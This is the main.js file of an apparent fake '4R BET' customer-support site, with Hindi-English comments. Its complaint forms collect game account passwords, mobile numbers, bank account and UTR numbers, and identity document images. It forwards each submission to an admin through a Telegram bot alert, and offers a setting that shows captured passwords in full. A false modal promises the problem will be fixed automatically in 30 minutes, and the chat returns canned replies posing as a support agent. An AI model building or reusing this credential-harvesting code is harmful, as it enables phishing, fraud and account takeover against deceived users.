/* ==========================================
   4R BET &mdash; Support Site  |  main.js
   ========================================== */

(function () {
  "use strict";

  /* ---------- Panel preferences (admin settings page se set hoti hain) ---------- */

  function uiPrefs() {
    try {
      var raw = localStorage.getItem("4rbet_ui");
      var d = raw ? JSON.parse(raw) : {};
      return {
        splash: d.splash !== false,
        showPassword: d.showPassword === true
      };
    } catch (e) {
      return { splash: true, showPassword: false };
    }
  }

  /* ---------- Opening animation (splash) ---------- */
  var splash = document.getElementById("splash");

  if (splash && !uiPrefs().splash) {
    splash.parentNode.removeChild(splash);
  } else if (splash) {
    var reduceMotion = window.matchMedia &&
                       window.matchMedia("(prefers-reduced-motion: reduce)").matches;

    var SPLASH_MS = reduceMotion ? 120 : 2000;

    document.body.classList.add("is-splash");

    var dismissSplash = function () {
      if (splash.parentNode) splash.parentNode.removeChild(splash);
      document.body.classList.remove("is-splash");
    };

    setTimeout(dismissSplash, SPLASH_MS);

    // safety net - tab background me ruka ho to bhi na phanse
    window.addEventListener("load", function () {
      setTimeout(dismissSplash, SPLASH_MS + 1500);
    });
  }

  /* ---------- Footer year ---------- */
  document.querySelectorAll("#year, .year").forEach(function (el) {
    el.textContent = new Date().getFullYear();
  });

  /* ---------- Card click / keyboard -> open page ---------- */
  document.querySelectorAll(".card[data-href]").forEach(function (card) {
    function open() {
      window.location.href = card.getAttribute("data-href");
    }
    card.addEventListener("click", open);
    card.addEventListener("keydown", function (e) {
      if (e.key === "Enter" || e.key === " ") {
        e.preventDefault();
        open();
      }
    });
  });

  /* ---------- Menu button ---------- */
  var menuBtn  = document.getElementById("menuBtn");
  var menuDrop = document.getElementById("menuDrop");

  if (menuBtn && menuDrop) {
    menuBtn.addEventListener("click", function (e) {
      e.stopPropagation();
      var open = menuDrop.classList.toggle("is-open");
      menuBtn.classList.toggle("is-open", open);
      menuBtn.setAttribute("aria-expanded", String(open));
    });

    document.addEventListener("click", function (e) {
      if (!menuDrop.contains(e.target) && !menuBtn.contains(e.target)) {
        menuDrop.classList.remove("is-open");
        menuBtn.classList.remove("is-open");
        menuBtn.setAttribute("aria-expanded", "false");
      }
    });

    document.addEventListener("keydown", function (e) {
      if (e.key === "Escape") {
        menuDrop.classList.remove("is-open");
        menuBtn.classList.remove("is-open");
        menuBtn.setAttribute("aria-expanded", "false");
      }
    });

    if (/\/mailbox\.html$/.test(window.location.pathname)) {
      menuDrop.querySelector('[href$="mailbox.html"]').classList.add("is-active");
    } else if (/\/index\.html$/.test(window.location.pathname) ||
               window.location.pathname === "/" ||
               window.location.pathname === "") {
      menuDrop.querySelector('[href$="index.html"]').classList.add("is-active");
    }
  }

  /* ---------- Simple validation ---------- */
  function showError(input, message) {
    var field = input.closest(".field");
    if (!field) return;
    field.classList.add("has-error");
    input.classList.add("is-error");
    var err = field.querySelector(".err");
    if (!err) {
      err = document.createElement("span");
      err.className = "err";
      field.appendChild(err);
    }
    err.textContent = message;
  }

  function clearError(input) {
    var field = input.closest(".field");
    if (!field) return;
    field.classList.remove("has-error");
    input.classList.remove("is-error");
    var err = field.querySelector(".err");
    if (err) err.classList.remove("is-show");
  }

  function alertBox(type, text) {
    var box = document.createElement("div");
    box.className = "alert alert--" + type;
    box.textContent = text;
    return box;
  }

  /* ---------- Popup / Modal ---------- */

  var MODAL_TITLE = "Your Complaint Sent";
  var MODAL_TEXT = "your complaint sent . Pleace wait for 30 minits you problem automatically fixed .";

  function buildModal() {
    var back = document.createElement("div");
    back.className = "modal-backdrop";
    back.setAttribute("role", "dialog");
    back.setAttribute("aria-modal", "true");

    var box = document.createElement("div");
    box.className = "modal";

    var icon = document.createElement("div");
    icon.className = "modal-icon";
    icon.innerHTML =
      '<svg viewBox="0 0 24 24" width="32" height="32" fill="none" stroke="currentColor" ' +
      'stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">' +
      '<path d="M20 6L9 17l-5-5"></path></svg>';

    var h = document.createElement("h3");
    h.className = "modal-title";
    h.textContent = MODAL_TITLE;

    var p = document.createElement("p");
    p.className = "modal-text";
    p.textContent = MODAL_TEXT;

    var ok = document.createElement("button");
    ok.type = "button";
    ok.className = "btn btn--block";
    ok.textContent = "OK";

    box.appendChild(icon);
    box.appendChild(h);
    box.appendChild(p);
    box.appendChild(ok);
    back.appendChild(box);

    function close() {
      back.classList.remove("is-open");
    }

    ok.addEventListener("click", close);
    back.addEventListener("click", function (e) {
      if (e.target === back) close();
    });

    return { backdrop: back, close: close };
  }

  var modal = buildModal();
  document.body.appendChild(modal.backdrop);

  document.addEventListener("keydown", function (e) {
    if (e.key === "Escape" && modal.backdrop.classList.contains("is-open")) modal.close();
  });

  function openModal() {
    modal.backdrop.classList.add("is-open");
  }

  /* ==========================================
     COMPLAINT STORE  (browser localStorage)
     ========================================== */

  var STORE_KEY = "4rbet_complaints";

  var CATEGORY = {
    depositForm: "Deposit Problem",
    withdrawalForm: "Withdrawal Problem",
    emailForm: "Email Verification",
    identityForm: "Identity Verification"
  };

  function loadComplaints() {
    try {
      var raw = localStorage.getItem(STORE_KEY);
      return raw ? JSON.parse(raw) : [];
    } catch (e) {
      return [];
    }
  }

  function persist(list) {
    localStorage.setItem(STORE_KEY, JSON.stringify(list));
  }

  /* Image ko thoda compress karke base64 me store karte hain taaki localStorage
     ka 5MB limit na phate, lekin quality utni hi rakhi jaati hai
     jitni upload hui thi - admin panel me image bilkul waisi hi dikhti hai. */
  function compressImage(file, maxSize, quality) {
    return new Promise(function (resolve) {
      if (!/^image\//.test(file.type)) { resolve(null); return; }

      var reader = new FileReader();
      reader.onerror = function () { resolve(null); };

      reader.onload = function () {
        var img = new Image();
        img.onerror = function () { resolve(null); };

        img.onload = function () {
          var scale = Math.min(1, maxSize / Math.max(img.width, img.height));
          var w = Math.max(1, Math.round(img.width * scale));
          var h = Math.max(1, Math.round(img.height * scale));

          var cv = document.createElement("canvas");
          cv.width = w;
          cv.height = h;
          cv.getContext("2d").drawImage(img, 0, 0, w, h);

          try { resolve(cv.toDataURL("image/jpeg", quality)); }
          catch (e) { resolve(null); }
        };

        img.src = reader.result;
      };

      reader.readAsDataURL(file);
    });
  }

  function collectImages(form) {
    var inputs = Array.prototype.slice.call(form.querySelectorAll('input[type="file"]'));

    return Promise.all(inputs.map(function (input) {
      var file = input.files && input.files[0];
      if (!file) return Promise.resolve(null);

      /* 1400px + 0.88 quality -> uploaded image jitni crisp, utni hi dikhegi */
      return compressImage(file, 1400, 0.88).then(function (dataUrl) {
        if (!dataUrl) return null;
        return { field: input.name, name: file.name, dataUrl: dataUrl };
      });
    })).then(function (list) {
      return list.filter(Boolean);
    });
  }

  function buildRecord(form, images) {
    var data = {};

    form.querySelectorAll("input, textarea, select").forEach(function (el) {
      if (!el.name || el.type === "file" || el.type === "submit") return;
      if (el.tagName === "SELECT") {
        var opt = el.options[el.selectedIndex];
        data[el.name] = opt && opt.value !== "" ? opt.text.trim() : "";
        return;
      }
      data[el.name] = el.value;
    });

    return {
      id: "CM-" + Date.now().toString().slice(-8),
      category: CATEGORY[form.id] || "Complaint",
      formId: form.id,
      data: data,
      images: images,
      status: "pending",
      submittedAt: new Date().toISOString()
    };
  }

  function addComplaint(record) {
    var list = loadComplaints();
    list.unshift(record);

    try {
      persist(list);
      return true;
    } catch (e) {
      // quota full -> images hata kar dubara try
      var light = Object.assign({}, record, { images: [] });
      var retry = [light].concat(list.slice(1).map(function (r) {
        return r.images && r.images.length ? Object.assign({}, r, { images: [] }) : r;
      }));

      try {
        persist(retry);
        return true;
      } catch (e2) {
        return false;
      }
    }
  }

  function formatDateTime(iso) {
    var d = new Date(iso);
    if (isNaN(d)) return "-";
    var pad = function (n) { return n < 10 ? "0" + n : "" + n; };
    var h = d.getHours();
    var h12 = h % 12 || 12;
    return d.getDate() + "/" + pad(d.getMonth() + 1) + "/" + d.getFullYear() +
           ", " + h12 + ":" + pad(d.getMinutes()) + " " + (h >= 12 ? "PM" : "AM");
  }

  /* ---------- Image viewer ---------- */

  var viewer = document.createElement("div");
  viewer.className = "viewer";
  viewer.innerHTML =
    '<div class="viewer-box">' +
      '<button type="button" class="viewer-close" aria-label="Close">&times;</button>' +
      '<img alt="Complaint image">' +
      '<p class="viewer-name"></p>' +
    '</div>';
  document.body.appendChild(viewer);

  var viewerImg = viewer.querySelector("img");
  var viewerName = viewer.querySelector(".viewer-name");

  function openViewer(src, name) {
    viewerImg.src = src;
    viewerName.textContent = name || "";
    viewer.classList.add("is-open");
  }

  function closeViewer() {
    viewer.classList.remove("is-open");
    viewerImg.removeAttribute("src");
  }

  viewer.querySelector(".viewer-close").addEventListener("click", closeViewer);
  viewer.addEventListener("click", function (e) {
    if (e.target === viewer) closeViewer();
  });
  document.addEventListener("keydown", function (e) {
    if (e.key === "Escape" && viewer.classList.contains("is-open")) closeViewer();
  });

  /* ---------- Mailbox render ---------- */

  var mailList = document.getElementById("mailList");

  if (mailList) {
    var records = loadComplaints();

    /* Complaint ke 3 status - user panel aur admin panel dono me same */
    var STATUS = {
      pending:    "Pending",
      previewing: "Previewing",
      successful: "Successful"
    };

    function statusOf(rec) {
      return STATUS[rec.status] ? rec.status : "pending";
    }

    function setStat(id, value) {
      var el = document.getElementById(id);
      if (el) el.textContent = value;
    }

    var total = records.length;
    var pending    = records.filter(function (r) { return statusOf(r) === "pending"; }).length;
    var previewing = records.filter(function (r) { return statusOf(r) === "previewing"; }).length;
    var done       = records.filter(function (r) { return statusOf(r) === "successful"; }).length;

    setStat("statTotal", total);
    setStat("statPending", pending);
    setStat("statPreviewing", previewing);
    setStat("statDone", done);

    if (!total) {
      mailList.innerHTML =
        '<div class="empty-state">' +
          '<h3>Koi complaint nahi mili</h3>' +
          '<p>Jo complaint aap bhejenge wo yahan dikhegi.</p>' +
          '<a class="btn" href="index.html">Send Complaint</a>' +
        '</div>';
    } else {
      var VIEW_ICON =
        '<svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" ' +
        'stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">' +
        '<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7Z"></path>' +
        '<circle cx="12" cy="12" r="3"></circle></svg>';

      function row(label, value, isPass) {
        return '<div class="mail-item">' +
                 '<span class="mail-k">' + label + '</span>' +
                 '<span class="mail-v' + (isPass ? ' mail-pass' : '') + '">' + value + '</span>' +
               '</div>';
      }

      /* Password: admin settings se "show password" on ho to poora, warna sirf 20% */
      var revealPassword = uiPrefs().showPassword;

      function maskPassword(pw) {
        pw = String(pw || "");
        if (revealPassword) return pw;
        var visible = Math.max(1, Math.ceil(pw.length * 0.2));
        return pw.slice(0, visible) + "*".repeat(pw.length - visible);
      }

      /* Sirf wahi fields dikhao jo us complaint me bhare hue hain */
      var MAIL_FIELDS = [
        { key: "userName",   label: "User Name" },
        { key: "mobile",     label: "Mobile Number" },
        { key: "email",      label: "Email ID" },
        { key: "password",   label: "Game Account Password", isPass: true },
        { key: "problem",    label: "Problem" },
        { key: "amount",     label: "Amount" },
        { key: "verifyEmail", label: "Verify Email" },
        { key: "docType",    label: "Document Type" },
        { key: "docNo",      label: "Document No." },
        { key: "accountNo",  label: "Account Number" },
        { key: "utr",        label: "Transaction / UTR No." },
        { key: "detail",     label: "Detail" }
      ];

      function esc(s) {
        return String(s === undefined || s === null ? "" : s)
          .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
      }

      mailList.innerHTML = records.map(function (r) {
        var d = r.data || {};
        var status = statusOf(r);
        var statusTxt = STATUS[status];

        var rowsHtml = MAIL_FIELDS.map(function (f) {
          var val = d[f.key];
          if (val === undefined || val === null || String(val).trim() === "") return "";
          var shown = f.isPass ? maskPassword(val) : esc(val);
          return row(f.label, shown, f.isPass);
        }).join("");

        var html =
          '<article class="mail-card">' +
            '<div class="mail-top">' +
              '<div>' +
                '<span class="mail-cat">' + esc(r.category) + '</span>' +
                '<span class="mail-id">' + esc(r.id) + ' &middot; ' + formatDateTime(r.submittedAt) + '</span>' +
              '</div>' +
              '<span class="badge badge--' + status + '">' + statusTxt + '</span>' +
            '</div>' +
            '<div class="mail-body">' +
              '<div class="mail-grid">' + rowsHtml + '</div>';

        if (r.images && r.images.length) {
          html += '<div class="mail-images">' +
            r.images.map(function (im, i) {
              return '<button type="button" class="img-btn" data-img="' + i + '">' +
                       VIEW_ICON + 'View Image</button>';
            }).join("") + '</div>';
        }

        html += '</div></article>';

        return html;
      }).join("");

      // image buttons -> open viewer
      mailList.querySelectorAll(".mail-card").forEach(function (cardEl, ci) {
        var rec = records[ci];
        cardEl.querySelectorAll(".img-btn").forEach(function (btn) {
          btn.addEventListener("click", function () {
            var im = rec.images[Number(btn.getAttribute("data-img"))];
            if (im && im.dataUrl) openViewer(im.dataUrl, im.name);
          });
        });
      });
    }
  }

  /* ==========================================
     FORM SUBMIT
     ========================================== */

  document.querySelectorAll("form[id]").forEach(function (form) {
    if (form.id === "chatForm") return; // chat alag se handle

    form.addEventListener("submit", function (e) {
      e.preventDefault();

      var firstBad = null;
      var old = form.querySelector(".alert");
      if (old) old.remove();

      form.querySelectorAll("input, textarea, select").forEach(function (input) {
        clearError(input);
        var val = (input.value || "").trim();

        if (input.type === "file") {
          if (input.required && !input.files.length) {
            showError(input, "Image upload karna zaroori hai.");
            if (!firstBad) firstBad = input;
          }
          return;
        }

        if (input.hasAttribute("required") && val === "") {
          showError(input, "Ye field zaroori hai.");
          if (!firstBad) firstBad = input;
        } else if (input.type === "number" && val !== "" && Number(val) <= 0) {
          showError(input, "Amount 0 se zyada honi chahiye.");
          if (!firstBad) firstBad = input;
        } else if (input.type === "tel" && val !== "" && !/^[0-9+\-\s]{10,15}$/.test(val)) {
          showError(input, "Sahi mobile number daalein.");
          if (!firstBad) firstBad = input;
        } else if (input.type === "email" && val !== "" && !/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(val)) {
          showError(input, "Sahi email ID daalein.");
          if (!firstBad) firstBad = input;
        } else if (input.type === "password" && val !== "" && val.length < 4) {
          showError(input, "Password kam se kam 4 characters ka ho.");
          if (!firstBad) firstBad = input;
        } else if (input.type === "text" && input.required && val.length < 3) {
          showError(input, "Kam se kam 3 characters daalein.");
          if (!firstBad) firstBad = input;
        }
      });

      if (firstBad) {
        firstBad.focus();
        return;
      }

      var submitBtn = form.querySelector('button[type="submit"]');
      if (submitBtn) submitBtn.classList.add("is-loading");

      var started = Date.now();

      collectImages(form).then(function (images) {
        var record = buildRecord(form, images);
        var saved  = addComplaint(record);

        /* ---------- Telegram alert (background me - user ko wait nahi karna padta) ---------- */
        if (window.FourRTelegram) {
          window.FourRTelegram.notifyComplaint(record).then(function (res) {
            if (res && res.skipped) {
              console.info("Telegram alert off hai - Admin Panel > Settings me bot token aur chat id set karein.");
            } else if (res && !res.ok) {
              console.warn("Telegram alert nahi gaya: " + res.error);
            }
            return window.FourRTelegram.flushQueue();
          });
        }

        var wait = Math.max(0, 3000 - (Date.now() - started));

        setTimeout(function () {
          if (submitBtn) submitBtn.classList.remove("is-loading");

          form.reset();
          hidePreview(form);
          openModal();

          if (!saved) {
            console.warn("Complaint save nahi hua - storage full ho sakta hai.");
          }
        }, wait);
      });
    });

    form.addEventListener("input", function (e) {
      if (e.target.classList && e.target.classList.contains("is-error")) clearError(e.target);
    });
  });

  /* ---------- Image upload: name + preview ---------- */

  function hidePreview(scope) {
    if (!scope) return;
    scope.querySelectorAll(".file-box").forEach(function (b) { b.classList.remove("is-done"); });
    scope.querySelectorAll(".file-name").forEach(function (n) {
      n.textContent = "";
      n.classList.remove("is-done");
    });
    scope.querySelectorAll(".field").forEach(function (f) { f.classList.remove("is-uploaded"); });
  }

  document.querySelectorAll('input[type="file"]').forEach(function (input) {
    var field   = input.closest(".field");
    var fileBox = input.closest(".file-box");
    var nameEl  = field ? field.querySelector(".file-name") : null;

    function reset() {
      if (fileBox) fileBox.classList.remove("is-done");
      if (nameEl) {
        nameEl.textContent = "";
        nameEl.classList.remove("is-done");
      }
      if (field) field.classList.remove("is-uploaded");
    }

    input.addEventListener("change", function () {
      clearError(input);

      var file = input.files && input.files[0];
      if (!file) {
        reset();
        return;
      }

      // Image yahan show nahi hoti - sirf green "uploaded" state
      if (fileBox) fileBox.classList.add("is-done");
      if (field) field.classList.add("is-uploaded");
      if (nameEl) {
        nameEl.textContent = file.name;
        nameEl.classList.add("is-done");
      }
    });

    input.addEventListener("click", function (e) {
      e.stopPropagation();
    });
  });

  /* ==========================================
     ONLINE CHAT
     ========================================== */

  var chatForm = document.getElementById("chatForm");
  var chatBox  = document.getElementById("chatMessages");
  var chatIn   = document.getElementById("chatField");
  var imageIn  = document.getElementById("imageInput");
  var fileIn   = document.getElementById("fileInput");

  if (chatBox) chatBox.scrollTop = chatBox.scrollHeight;

  var replies = [
    "Aapka message mil gaya. Kya aap apna User ID de sakte hain?",
    "Dhanyavaad! Problem note kar li gayi hai.",
    "Koi bhi aur sawal ho to yahi message karein."
  ];
  var rIndex = 0;

  function stamp() {
    var d = new Date();
    var pad = function (n) { return n < 10 ? "0" + n : "" + n; };
    var h = d.getHours();
    var h12 = h % 12 || 12;
    return d.getDate() + "/" + pad(d.getMonth() + 1) + "/" + d.getFullYear() +
           ", " + h12 + ":" + pad(d.getMinutes()) + " " + (h >= 12 ? "PM" : "AM");
  }

  /* ---------- Chat message popup ---------- */

  var chatPopup = document.createElement("div");
  chatPopup.className = "modal-backdrop";
  chatPopup.setAttribute("role", "dialog");
  chatPopup.setAttribute("aria-modal", "true");

  chatPopup.innerHTML =
    '<div class="modal chat-popup">' +
      '<button type="button" class="popup-x" aria-label="Close">&times;</button>' +
      '<h3 class="modal-title chat-popup-title">Chat Message</h3>' +
      '<p class="chat-popup-when"></p>' +
      '<div class="chat-popup-body"></div>' +
      '<div class="chat-popup-acts">' +
        '<button type="button" class="cpa cpa--edit">Edit</button>' +
        '<button type="button" class="cpa cpa--replay">Replay</button>' +
        '<button type="button" class="cpa cpa--delete">Delete</button>' +
      '</div>' +
      '<div class="chat-popup-edit" style="display:none">' +
        '<textarea rows="3" class="popup-edit-field"></textarea>' +
        '<div class="popup-edit-row">' +
          '<button type="button" class="btn btn--ghost popup-edit-save">Save</button>' +
          '<button type="button" class="btn btn--ghost popup-edit-cancel">Cancel</button>' +
        '</div>' +
      '</div>' +
      '<button type="button" class="btn btn--block popup-close">Close</button>' +
    '</div>';

  document.body.appendChild(chatPopup);

  var ppTitle  = chatPopup.querySelector(".chat-popup-title");
  var ppWhen   = chatPopup.querySelector(".chat-popup-when");
  var ppBody   = chatPopup.querySelector(".chat-popup-body");
  var ppEdit   = chatPopup.querySelector(".chat-popup-edit");
  var ppField  = chatPopup.querySelector(".popup-edit-field");
  var ppActs   = chatPopup.querySelector(".chat-popup-acts");

  var editingMsg = null;

  function closePopup() {
    chatPopup.classList.remove("is-open");
    ppEdit.style.display = "none";
    ppActs.style.display = "";
    editingMsg = null;
  }

  function openPopup(node) {
    var textEl = node.querySelector(".msg-text");
    var imgEl  = node.querySelector(".msg-image");

    ppTitle.textContent = node.dataset.who === "user" ? "Your Message" : "Support Agent";
    ppWhen.innerHTML = "<strong>Sent:</strong> " + node.dataset.time;

    ppBody.innerHTML = "";

    if (imgEl) {
      var big = document.createElement("img");
      big.className = "popup-img";
      big.src = imgEl.getAttribute("src");
      big.alt = imgEl.getAttribute("alt") || "image";
      ppBody.appendChild(big);

      var nm = document.createElement("p");
      nm.className = "popup-file-name";
      nm.textContent = imgEl.getAttribute("data-name") || "";
      ppBody.appendChild(nm);
    } else {
      var p = document.createElement("p");
      p.className = "popup-text";
      p.textContent = textEl ? textEl.textContent : "";
      ppBody.appendChild(p);
    }

    editingMsg = node;
    chatPopup.classList.add("is-open");
  }

  chatPopup.querySelector(".popup-x").addEventListener("click", closePopup);
  chatPopup.querySelector(".popup-close").addEventListener("click", closePopup);
  chatPopup.addEventListener("click", function (e) {
    if (e.target === chatPopup) closePopup();
  });

  document.addEventListener("keydown", function (e) {
    if (e.key === "Escape" && chatPopup.classList.contains("is-open")) closePopup();
  });

  /* Edit */
  chatPopup.querySelector(".cpa--edit").addEventListener("click", function () {
    if (!editingMsg) return;
    var t = editingMsg.querySelector(".msg-text");
    if (!t) return;                       // image message edit nahi hoti
    ppField.value = t.textContent;
    ppEdit.style.display = "block";
    ppActs.style.display = "none";
    ppField.focus();
  });

  chatPopup.querySelector(".popup-edit-cancel").addEventListener("click", closePopup);

  chatPopup.querySelector(".popup-edit-save").addEventListener("click", function () {
    if (!editingMsg) return;
    var t = editingMsg.querySelector(".msg-text");
    if (t) t.textContent = ppField.value.trim();
    closePopup();
  });

  /* Replay */
  chatPopup.querySelector(".cpa--replay").addEventListener("click", function () {
    if (!editingMsg) return;
    var t = editingMsg.querySelector(".msg-text");
    if (t) addMsg(t.textContent, "user", "You");
    closePopup();
  });

  /* Delete */
  chatPopup.querySelector(".cpa--delete").addEventListener("click", function () {
    if (editingMsg && editingMsg.parentNode) editingMsg.parentNode.removeChild(editingMsg);
    closePopup();
  });

  /* ---------- Add message ---------- */

  function addMsg(text, who, name) {
    var d = document.createElement("div");
    d.className = "msg msg--" + who;
    d.dataset.who = who;
    d.dataset.time = stamp();
    d.setAttribute("role", "button");
    d.setAttribute("tabindex", "0");

    if (name) {
      var n = document.createElement("span");
      n.className = "msg-name";
      n.textContent = name;
      d.appendChild(n);
    }

    var p = document.createElement("p");
    p.className = "msg-text";
    p.textContent = text;
    d.appendChild(p);

    d.addEventListener("click", function () { openPopup(d); });
    d.addEventListener("keydown", function (e) {
      if (e.key === "Enter" || e.key === " ") {
        e.preventDefault();
        openPopup(d);
      }
    });

    chatBox.appendChild(d);
    chatBox.scrollTop = chatBox.scrollHeight;
    return d;
  }

  /* ---------- Add image / file message ---------- */

  function addFileMsg(src, name, isImage) {
    var d = document.createElement("div");
    d.className = "msg msg--user msg--file";
    d.dataset.who = "user";
    d.dataset.time = stamp();
    d.setAttribute("role", "button");
    d.setAttribute("tabindex", "0");

    var n = document.createElement("span");
    n.className = "msg-name";
    n.textContent = "You";
    d.appendChild(n);

    if (isImage) {
      var img = document.createElement("img");
      img.className = "msg-image";
      img.setAttribute("data-name", name);
      img.src = src;
      img.alt = name;
      d.appendChild(img);

      var cap = document.createElement("span");
      cap.className = "msg-file-cap";
      cap.textContent = name;
      d.appendChild(cap);
    } else {
      var ico = document.createElement("span");
      ico.className = "msg-file-ico";
      ico.innerHTML =
        '<svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" ' +
        'stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round">' +
        '<path d="M14 2.5H7.5A2.5 2.5 0 0 0 5 5v14a2.5 2.5 0 0 0 2.5 2.5h9A2.5 2.5 0 0 0 19 19V7.5L14 2.5Z"></path>' +
        '<path d="M14 2.5V7a.5.5 0 0 0 .5.5H19"></path></svg>';
      d.appendChild(ico);

      var lbl = document.createElement("span");
      lbl.className = "msg-file-name";
      lbl.textContent = name;
      d.appendChild(lbl);
    }

    d.addEventListener("click", function () { openPopup(d); });
    d.addEventListener("keydown", function (e) {
      if (e.key === "Enter" || e.key === " ") {
        e.preventDefault();
        openPopup(d);
      }
    });

    chatBox.appendChild(d);
    chatBox.scrollTop = chatBox.scrollHeight;
  }

  /* ---------- Image / file pickers ---------- */

  var btnImage = document.getElementById("btnImage");
  var btnFile  = document.getElementById("btnFile");

  if (btnImage && imageIn) {
    btnImage.addEventListener("click", function () { imageIn.click(); });
  }

  if (btnFile && fileIn) {
    btnFile.addEventListener("click", function () { fileIn.click(); });
  }

  if (imageIn) {
    imageIn.addEventListener("change", function () {
      var f = imageIn.files && imageIn.files[0];
      if (!f) return;
      var url = URL.createObjectURL(f);
      addFileMsg(url, f.name, true);
      imageIn.value = "";
    });
  }

  if (fileIn) {
    fileIn.addEventListener("change", function () {
      var f = fileIn.files && fileIn.files[0];
      if (!f) return;
      var url = URL.createObjectURL(f);
      addFileMsg(url, f.name, false);
      fileIn.value = "";
    });
  }

  /* ---------- Send text ---------- */

  if (chatForm && chatBox && chatIn) {
    chatForm.addEventListener("submit", function (e) {
      e.preventDefault();
      var text = chatIn.value.trim();
      if (!text) return;

      addMsg(text, "user", "You");
      chatIn.value = "";

      setTimeout(function () {
        addMsg(replies[rIndex % replies.length], "agent", "Support Agent");
        rIndex++;
      }, 600);
    });
  }

  /* ---------- Toast (optional helper) ---------- */
  window.showToast = function (text) {
    var t = document.createElement("div");
    t.className = "toast";
    t.textContent = text;
    document.body.appendChild(t);
    setTimeout(function () { t.remove(); }, 3000);
  };

})();
